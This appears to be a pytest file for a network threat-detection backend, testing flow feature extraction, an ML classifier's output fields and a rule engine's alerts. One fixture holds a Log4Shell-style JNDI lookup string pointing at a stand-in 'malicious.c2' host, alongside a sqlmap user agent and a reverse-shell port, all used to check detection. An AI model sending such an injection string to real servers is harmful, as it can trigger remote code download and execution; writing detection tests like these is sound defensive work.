import pytest
from backend.app.detection.rule_detector import rule_engine
from backend.app.detection.feature_engineering import extract_flow_features
from backend.app.detection.ml_detector import ml_detector

def test_feature_extraction():
    features = {
        "flow_duration": 5000.0,
        "total_fwd_packets": 10,
        "total_bwd_packets": 5,
        "dest_port": 443
    }
    vec = extract_flow_features(features)
    assert vec.shape == (1, 18)
    assert vec[0, 0] == 5000.0
    assert vec[0, 1] == 10.0
    assert vec[0, 16] == 443.0

def test_rule_detection_suspicious_port():
    event = {
        "source": "10.0.0.99",
        "destination": "192.168.1.1",
        "features": {"dest_port": 4444},
        "metadata": {"dest_port": 4444}
    }
    is_threat, matches, sev = rule_engine.evaluate(event)
    assert is_threat is True
    assert any("RULE_SUSPICIOUS_PORT" in m for m in matches)

def test_ml_detection_inference():
    features = {
        "dest_port": 443,
        "flow_duration": 800.0,
        "total_fwd_packets": 150,
        "total_bwd_packets": 1,
        "fwd_packet_length_mean": 64.0,
        "flow_packets_per_sec": 120000.0
    }
    result = ml_detector.predict(features)
    assert "prediction" in result
    assert "attack_type" in result
    assert "confidence" in result
    assert 0.0 <= result["confidence"] <= 1.0
    assert result["processing_latency_ms"] >= 0.0
    assert "explainability" in result
    assert "top_features" in result["explainability"]
    assert len(result["explainability"]["top_features"]) > 0

def test_rule_detection_log4j_and_scanner():
    log4j_event = {
        "source": "198.51.100.22",
        "destination": "10.0.0.10",
        "features": {"dest_port": 8080},
        "metadata": {"query": "${jndi:ldap://malicious.c2/a}", "user_agent": "sqlmap/1.6"}
    }
    is_threat, matches, sev = rule_engine.evaluate(log4j_event)
    assert is_threat is True
    assert any("RULE_MALICIOUS_PAYLOAD_SIGNATURE" in m for m in matches)
    assert any("RULE_SCANNER_DETECTED" in m for m in matches)
    assert sev in ("HIGH", "CRITICAL")
